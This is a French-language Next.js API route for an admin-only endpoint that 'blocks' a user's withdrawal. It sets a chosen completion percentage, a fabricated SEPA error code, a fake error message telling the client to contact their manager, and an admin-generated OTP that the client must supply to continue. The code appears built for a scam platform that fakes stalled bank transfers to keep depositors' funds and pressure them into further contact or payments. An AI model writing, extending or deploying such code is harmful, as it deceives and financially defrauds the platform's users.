import { eq } from "drizzle-orm";
import { NextResponse } from "next/server";
import { isAdminAuthenticated } from "@/lib/auth";
import { db } from "@/lib/db";
import { usersTable, withdrawalRequestsTable } from "@/lib/schema";

export async function POST(request: Request) {
  try {
    if (!(await isAdminAuthenticated())) {
      return NextResponse.json({ success: false, message: "Non autorisé." }, { status: 401 });
    }

    const body: unknown = await request.json();
    if (!body || typeof body !== "object" || !("withdrawalId" in body)) {
      return NextResponse.json({ success: false, message: "Données de blocage invalides." }, { status: 400 });
    }
    const { withdrawalId, haltPercent, otpCode, haltMessage, errorCode } = body as {
      withdrawalId?: string;
      haltPercent?: number;
      otpCode?: string;
      haltMessage?: string;
      errorCode?: string;
    };

    if (typeof withdrawalId !== "string" || !withdrawalId.trim()) {
      return NextResponse.json({ success: false, message: "ID du virement requis." }, { status: 400 });
    }

    const [withdrawal] = await db
      .select({
        id: withdrawalRequestsTable.id,
        userId: withdrawalRequestsTable.userId,
        recipientName: withdrawalRequestsTable.recipientName,
        amountCents: withdrawalRequestsTable.amountCents,
        status: withdrawalRequestsTable.status,
        currency: usersTable.currency,
      })
      .from(withdrawalRequestsTable)
      .leftJoin(usersTable, eq(withdrawalRequestsTable.userId, usersTable.id))
      .where(eq(withdrawalRequestsTable.id, withdrawalId))
      .limit(1);

    if (!withdrawal) {
      return NextResponse.json({ success: false, message: "Virement introuvable." }, { status: 404 });
    }

    const finalPercent = Math.min(100, Math.max(1, typeof haltPercent === "number" ? haltPercent : parseInt(String(haltPercent) || "50", 10)));
    const finalCode = (typeof otpCode === "string" && otpCode.trim().length === 6)
      ? otpCode.trim()
      : Math.floor(100000 + Math.random() * 900000).toString();
    const finalMessage = (typeof haltMessage === "string" && haltMessage.trim())
      ? haltMessage.trim().slice(0, 500)
      : "Une erreur est survenue, veuillez contacter votre gestionnaire ou bien tentez à nouveau plus tard.";
    const finalErrCode = (typeof errorCode === "string" && errorCode.trim())
      ? errorCode.trim()
      : `ERR_SEPA_${finalPercent}`;

    // On configure le blocage : le statut passe en pending_otp pour que le client doive entrer le code
    await db
      .update(withdrawalRequestsTable)
      .set({
        status: "pending_otp",
        otpCode: finalCode,
        haltPercent: finalPercent,
        haltMessage: finalMessage,
        errorCode: finalErrCode,
      })
      .where(eq(withdrawalRequestsTable.id, withdrawalId));

    return NextResponse.json({
      success: true,
      message: `Protocole de blocage configuré avec succès à ${finalPercent}%. Code OTP généré : ${finalCode}`,
      otpCode: finalCode,
      haltPercent: finalPercent,
      haltMessage: finalMessage,
      errorCode: finalErrCode,
    });
  } catch (error) {
    console.error("Erreur lors du blocage du virement :", error);
    return NextResponse.json({ success: false, message: "Erreur serveur." }, { status: 500 });
  }
}